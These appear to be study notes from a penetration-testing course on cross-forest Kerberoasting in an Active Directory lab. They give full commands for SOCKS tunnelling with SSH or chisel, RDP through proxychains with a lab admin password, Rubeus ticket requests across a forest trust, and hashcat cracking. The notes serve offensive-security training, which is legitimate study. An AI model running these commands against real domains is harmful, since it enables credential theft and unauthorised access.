# 14.03 Cross-Forest Kerberoasting

> Kerberoast SPNs across a bidirectional/inbound forest trust with `Rubeus /domain` or `GetUserSPNs.py -target-domain`.

## Overview

Kerberoast SPNs in a trusted forest across a bidirectional or inbound cross-forest trust using Rubeus from a position in the trusting domain. No new card exists — this is covered in passing in the course but demonstrated with full commands including RDP setup via proxychains and hashcat cracking.

## Steps

- Set up proxychains tunnel via SSH dynamic forwarding or chisel to reach internal forest DCs
- RDP into the <DOMAIN> DC with proxychains xfreerdp
- Run **Rubeus kerberoast /domain:logistics.ad** to enumerate and request TGS tickets across the trust
- Crack with **hashcat -m 13100** (Kerberos 5, etype 23, TGS-REP)

## Commands

### SSH tunnel for proxychains

```bash
ssh -D 1080 [email protected]
```

### Chisel client (alternative)

```bash
sudo chisel client <TARGET>:8080 socks
```

### RDP via proxychains

```bash
proxychains xfreerdp /u:Administrator /p:'HTB_@cademy_adm!' /v:172.16.118.3 /dynamic-resolution
```

### Kerberoast cross-forest

```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /domain:logistics.ad
```

### Crack TGS hash

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```
